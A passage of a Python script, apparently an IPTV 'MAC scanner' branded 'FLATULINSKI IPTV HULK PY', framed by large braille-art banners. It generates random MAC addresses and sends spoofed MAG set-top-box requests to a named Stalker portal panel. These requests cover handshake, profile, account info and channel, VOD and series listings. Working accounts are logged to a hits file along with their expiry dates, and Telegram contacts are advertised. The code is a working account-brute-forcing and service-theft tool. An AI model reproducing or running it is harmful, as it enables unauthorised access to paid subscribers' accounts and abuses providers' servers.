⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⡆⣿⠙⠛⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣸⣧⣤⣤⣶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠸⡆⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠟⠛⠉⠙⠃⣿⡇⠀⠀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⠛⠛⠛⠛⠿⢿⣿⣷⣦⣄⡀⠀⠀⠀⢰⡇⠀⠀⢻⣄⠀⣀⣴⣾⣿⠿⠟⣩⠇⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠸⣦⣛⣛⣻⡿⠷⠶⠶⢿⡇⠀⠀⢸⡟⠿⠟⠛⠙⠓⠲⠾⣦⠀⠀⠀⠀⣠⣾⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠠⠞⠛⠁⠀⠀⠀⢀⣼⣧⠀⠀⠀⡿⢦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⡁⠙⠀⠀⠰⢃⣸⡏⠉⠉⠛⢶⣄⡀⠀⠀⠀⢸⡁⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠻⡆⠀⠀⠀⠀⢀⣼⠏⠀⠘⠻⢷⣤⣤⣶⠟⠉⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠈⡇⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢿⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⠃⠀⠀⢸⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⢸⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⣾⡏⠉⠙⠛⠒⠒⠒⠒⠒⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠛⣿⣆⠀⠀⠀⠀⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠃⠀⠀⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠁⠀⠀⠙⢿⣷⣀⠀⠀⠹⡇⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣠⡴⠶⠛⠉⠉⠹⣷⠀⠀⠀⠀⠀⢀⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⣿⣦⡀⠀⠁⠀⣾⡉⠀⢀⣠⣉⡉⣻⡿⣧⣤⡤⠞⣲⣶⠚⢻⡇⠀⠀⠀⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⣠⠿⠭⠽⠗⠒⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⡉⠉⠁⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠰⣄⠀⠀⠀⠀⣀⣠⣤⣤⣀⣀⠀⣀⣠⡼⠃⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠀⠀⠈⠓⠒⠒⠛⠉⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⠁⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠤⢤⣤⣤⣄⣀⡀⠈⠛⠿⣷⣶⣶⣶⣶⣶⣦⣤⣴⣴⣶⣶⣶⣾⠿⠛⠉⠀⠀⠀⣠⣴⡶⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠷⣦⣤⣀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣤⡀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠻⢦⣤⣀⡤⠴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀\33[0m

\33[1;91m               Determine number of bots (mMx 15)\33[0m

\33[1;96mBots=\33[1;92m""" )
#subprocess.run(["clear", ""])
print(feyzo)
if botsay=="":
	botsay=int(4)
botsay=int(botsay)
 		
kanalkata="0"      
kanalkata=input("""
\033[1;92m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣾⣶⣶⡾⠷⠷⣶⣶⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⢛⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢋⣵⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡿⢡⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⢻⡀⠀⠀⠘⣿⣦⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣷⣿⡏⠀⠀⠀⠀⠀⡀⠀⢀⡄⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠙⣷⣄⠀⠀⠀⢳⡄⠀⠀⣿⡿⠿⠿⣿⣿⣿⣷⣦⣤⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣏⣿⠀⠀⠀⠀⠀⣴⡇⠀⣼⡁⠀⠀⣿⣷⣄⠀⠀⠀⠀⠀⠈⢻⣏⠻⠶⣤⣀⡀⠀⠀⠀⠘⢿⣷⡄⠀⠈⣿⠀⠀⣸⡇⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣷⣶⣄⡀
⠀⠀⢀⣠⣤⣶⣾⣿⡟⠀⠀⠀⢀⣾⣿⠁⣰⣿⣇⠀⠀⢸⣇⠙⠷⣤⣄⠀⠀⠀⠀⠙⢷⣤⡀⠉⠙⠛⠲⢶⣤⣌⣷⡟⣦⠀⢸⣇⠀⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻
⣾⡿⠿⠟⠛⠋⠁⢸⣧⠀⠀⠀⣼⠏⣿⣆⣿⠃⢿⣆⠀⠀⢿⣆⠀⠈⠙⠛⠷⠦⣤⣤⣄⣙⣻⣦⣤⣠⠀⠀⠀⠈⠉⠛⠛⢷⣼⣿⢰⡟⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢸⡿⠀⢻⣿⡿⠀⠈⢻⣦⣀⠘⢿⣄⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⡌⢻⣿⣿⠏⠁⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⣾⡇⠀⠈⢿⡇⠀⠀⠀⠉⠻⣷⣌⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⣿⢹⡟⢱⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡏⣿⡄⣿⡇⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠙⠛⠷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⣿⣜⣴⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⡆⣿⠙⠛⠲⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣸⣧⣤⣤⣶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠸⡆⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠟⠛⠉⠙⠃⣿⡇⠀⠀⠀⠈⠛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⠛⠛⠛⠛⠿⢿⣿⣷⣦⣄⡀⠀⠀⠀⢰⡇⠀⠀⢻⣄⠀⣀⣴⣾⣿⠿⠟⣩⠇⠀⠀⠀⠀⢀⣿⠃⠀⠀⠀⠀⠀⠀⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠸⣦⣛⣛⣻⡿⠷⠶⠶⢿⡇⠀⠀⢸⡟⠿⠟⠛⠙⠓⠲⠾⣦⠀⠀⠀⠀⣠⣾⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠠⠞⠛⠁⠀⠀⠀⢀⣼⣧⠀⠀⠀⡿⢦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⡁⠙⠀⠀⠰⢃⣸⡏⠉⠉⠛⢶⣄⡀⠀⠀⠀⢸⡁⠀⠈⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠈⠻⡆⠀⠀⠀⠀⢀⣼⠏⠀⠘⠻⢷⣤⣤⣶⠟⠉⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠈⡇⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢿⠀⠀⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀⠃⠀⠀⢸⣿⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⢸⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⣾⡏⠉⠙⠛⠒⠒⠒⠒⠒⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠛⣿⣆⠀⠀⠀⠀⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠃⠀⠀⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠁⠀⠀⠙⢿⣷⣀⠀⠀⠹⡇⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣠⡴⠶⠛⠉⠉⠹⣷⠀⠀⠀⠀⠀⢀⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠙⣿⣦⡀⠀⠁⠀⣾⡉⠀⢀⣠⣉⡉⣻⡿⣧⣤⡤⠞⣲⣶⠚⢻⡇⠀⠀⠀⣴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⡀⠀⣠⠿⠭⠽⠗⠒⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⡉⠉⠁⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠰⣄⠀⠀⠀⠀⣀⣠⣤⣤⣀⣀⠀⣀⣠⡼⠃⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣧⠀⠀⠈⠓⠒⠒⠛⠉⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⠁⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠤⢤⣤⣤⣄⣀⡀⠈⠛⠿⣷⣶⣶⣶⣶⣶⣦⣤⣴⣴⣶⣶⣶⣾⠿⠛⠉⠀⠀⠀⣠⣴⡶⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠻⠷⣦⣤⣀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣤⡀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠻⢦⣤⣀⡤⠴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀\33[0m

\033[1;92m                Details for you ScanText file

\033[1;96m                0 \33[0m\033[1;91mWithout (only access data)  
\033[1;96m                1 \33[0m\033[1;91mLive TV only (countries)      
\033[1;96m                2 \33[0m\033[1;91mEverything (LiveTv VOD Series)   
            
\033[1;96mChoose 0-2 =\033[1;92m""")      
if kanalkata=="":
	kanalkata="0"


gsay=0
vsay=0

if panel=="" :
    panel="center.chmedia.xyz:8080"

Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
panel=panel.replace('stalker_portal','/stalker_portal')
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
#subprocess.run(["clear", ""])
print(feyzo) 
acount_id=""
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1

Dosyab=hits='./hits/' +panel.replace(":","_").replace('/','') +"_HulkPy.txt"
say=1
def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()	

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()

    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')
import time
from datetime import date

def tarih_clear(trh):
	#trh=tarih_exp
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	#print(ay)
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	#print(my_date)
	if 1==1:
		
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
	#except:pass
	


macs=""	
sayi=1
b1hitc=0
b2hitc=0


def randommac():
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
		#print(genmac)
	except:pass
	genmac=genmac.replace(':100',':10')
	return genmac


url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token&prehash&JsHttpRequest=1-xml" 


url2="http://"+panel+"/"+uzmanm+"?action=get_profile&type=stb&&sn=""&device_id=""&device_id2="
if realblue=="real":
	url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 

url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"

vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"




def url(cid):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
	return url7

def hea1(macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return 	HEADERA

def hea2(macs,token):
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+token,
	}
	return HEADERd


def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea
	

hityaz=0	
	
def hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC):
	global hitr
	global hityaz
	try:
		
		imza="""
	
    👄FLATULINSKI🧟IPTV👄
         🅗🅤🅛🅚 🅟🅨 
      Windows Edition          ⠀⠀⠀⠀⠀
   Visit us on Telegram    
https://t.me/FlatulinskiIpTvHilfe       
Write Me :
https://t.me/FlatulinskiTv    
🧟RealUrl ➤ http://"""+str(real)+"""
🧟Panel ➤ http://"""+str(panel)+"""/c/
🧟MacAdresse ➤"""+str(mac)+"""
🧟Mindestens Haltbar bis ➤"""+str(trh)+"""
👄FLATULINSKI🧟IPTV👄
     🅗🅤🅛🅚 🅟🅨
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⢯⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⢴⣿⠋⠟⡒⠤⠤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢌⠉⡀⣾⠁⠀⠀⠈⣢⡤⠤⡆⠀⠀⠀⠀⠀
